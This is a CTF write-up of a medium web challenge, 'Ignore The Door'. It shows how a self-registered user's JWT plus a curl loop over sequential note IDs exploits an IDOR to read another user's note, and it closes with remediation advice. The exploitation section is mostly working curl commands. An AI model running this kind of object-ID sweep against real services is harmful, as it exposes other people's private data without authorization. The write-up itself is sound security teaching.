# Ignore The Door — CTF Writeup

**Category:** Web Security
**Difficulty:** Medium
**Points:** 200
**Target:** `ctf-akshay-ignore-the-door-14d51c46.challenges.pentestgarage.com`

## Summary

A notes-taking web app with a login/register flow. The intended "front door" (login form) is a red herring — the real vulnerability is an **Insecure Direct Object Reference (IDOR)** on the note-retrieval API, reachable by any authenticated user, including a freshly self-registered one.

## Recon

### 1. Initial page load

```bash
curl ctf-akshay-ignore-the-door-14d51c46.challenges.pentestgarage.com
```

Returned a simple landing page with a `Login` button linking to `/auth`, and referenced `/static/js/script.js`.

### 2. `/auth` page

Login/Register form calling client-side JS handlers (`loginHandler()`, `registerHandler()`).

### 3. Reading the client-side JS

```bash
curl -s http://<target>/static/js/script.js
```

This revealed the full API surface:

| Method | Endpoint | Auth required |
|---|---|---|
| POST | `/api/login` | No |
| POST | `/api/register` | No |
| GET | `/api/user/notes` | Yes (JWT) |
| GET | `/api/user/note/:id` | Yes (JWT) |
| POST | `/api/user/addnote` | Yes (JWT) |

No admin credentials were needed — **registration is open to anyone**, so a low-privilege account was sufficient to reach the authenticated API surface.

## Exploitation

### 1. Register an account

```bash
curl -s -X POST http://<target>/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"tester1","password":"Test1234!"}'
```

### 2. Log in and grab a JWT

```bash
curl -s -X POST http://<target>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"tester1","password":"Test1234!"}'
```

The returned JWT's payload included a custom `jwk` claim pointing to `/api/pubkey` (an RSA key-confusion angle was considered but the endpoint 404'd and wasn't needed — the IDOR was sufficient).

### 3. Confirm own notes are empty, then create one

```bash
TOKEN="<jwt from login>"

curl -s http://<target>/api/user/notes -H "Authorization: Bearer $TOKEN"
# {"notes":[]}

curl -s -X POST http://<target>/api/user/addnote \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"title":"test","note":"hello"}'
```

The new note came back with **`ID: 2`** — confirming note IDs are **global and sequential** across all users, not scoped per-account.

### 4. Exploit the IDOR

`GET /api/user/note/:id` only checks that the requester holds a valid JWT — it never verifies the note actually belongs to that user. Sweeping low IDs:

```bash
for i in $(seq 1 10); do
  echo "=== note $i ==="
  curl -s http://<target>/api/user/note/$i -H "Authorization: Bearer $TOKEN"
  echo
done
```

`ID: 1` (created before our account existed, i.e. belonging to another user) returned:

```json
{"note":{"ID":1,"title":"Flag","note":"ctf{ieM1yoo0Ru4sha3aeBei9reebemaish6}", ...}}
```

## Flag

```
ctf{ieM1yoo0Ru4sha3aeBei9reebemaish6}
```

## Root Cause

`GET /api/user/note/:id` performs authentication (valid JWT required) but not **authorization** (no check that `note.owner_id == requester.id`). This is a textbook IDOR / Broken Object Level Authorization (OWASP API1:2023).

## Lessons / Remediation

- Every object-level lookup (`/note/:id`, `/document/:id`, etc.) must verify the authenticated user actually owns or has rights to that object, not just that they're logged in.
- Sequential, guessable IDs make IDORs trivial to exploit — consider UUIDs, though this is defense-in-depth, not a substitute for proper authorization checks.
- Open self-registration widens the pool of accounts that can be used to probe authenticated-but-unauthorized endpoints, so authorization boundaries between users matter even when "anyone can sign up."
- Client-side JS is not a safe place to imply that an endpoint is "internal only" — anything shipped to the browser is discoverable.
